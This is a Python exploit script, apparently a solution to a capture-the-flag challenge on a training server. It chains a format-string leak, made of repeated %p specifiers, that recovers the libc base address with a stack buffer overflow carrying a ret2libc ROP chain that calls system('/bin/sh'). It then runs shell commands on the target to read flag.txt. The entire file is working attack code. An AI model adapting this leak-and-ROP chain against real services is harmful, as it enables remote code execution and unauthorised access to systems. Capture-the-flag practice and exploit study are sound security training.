import sys, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = "xebec.cylabacademy.net", 33416
POP_RDI = 0x2164f
RET = 0x2139f
SYSTEM = 0x4f420
BINSH = 0x1b3d88
LM_OFFS = [0x21c87, 0x21c93, 0x21ba0, 0x21b97, 0x21bb0]
FMT = ".".join(["%p"] * 40)


def attempt(off):
    s = socket.create_connection((host, port), timeout=12)
    s.settimeout(5)
    s.sendall(FMT.encode() + b"\n")
    out = b""
    t0 = time.time()
    while out.count(b"0x") < 20 and time.time() - t0 < 5:
        try:
            c = s.recv(8192)
            if not c:
                break
            out += c
        except socket.timeout:
            break
    vals = [int(v, 16) for v in re.findall(rb"0x[0-9a-f]+", out)]
    base = None
    for v in vals:
        if 0x7f0000000000 <= v <= 0x7fffffffffff:
            cand = v - off
            if cand & 0xfff == 0:
                base = cand
                break
    if base is None:
        s.close()
        return None, "pas de base"
    system = base + SYSTEM
    binsh = base + BINSH
    payload = b"A" * 0x70 + b"B" * 8 + struct.pack("<Q", base + POP_RDI) + \
        struct.pack("<Q", binsh) + struct.pack("<Q", base + RET) + struct.pack("<Q", system)
    if b"\n" in payload:
        s.close()
        return None, "newline"
    s.sendall(payload + b"\n")
    time.sleep(0.5)
    s.sendall(b"cat flag.txt; ls; echo FIN\n")
    res = b""
    t0 = time.time()
    while time.time() - t0 < 8:
        try:
            c = s.recv(8192)
            if not c:
                break
            res += c
            if b"FIN" in res:
                break
        except socket.timeout:
            break
    s.close()
    return res.decode("latin-1", "replace"), "base=0x%x" % base


for off in LM_OFFS:
    txt, info = attempt(off)
    print("=== offset 0x%x -> %s ===" % (off, info))
    if txt:
        print(txt[-300:].replace("\n", " ")[:300])
        m = re.search(r"\b[0-9a-f]{20,40}\b", txt)
        if m and "flag.txt" in txt:
            print("CANDIDAT FLAG:", m.group(0))
            break
    time.sleep(0.5)
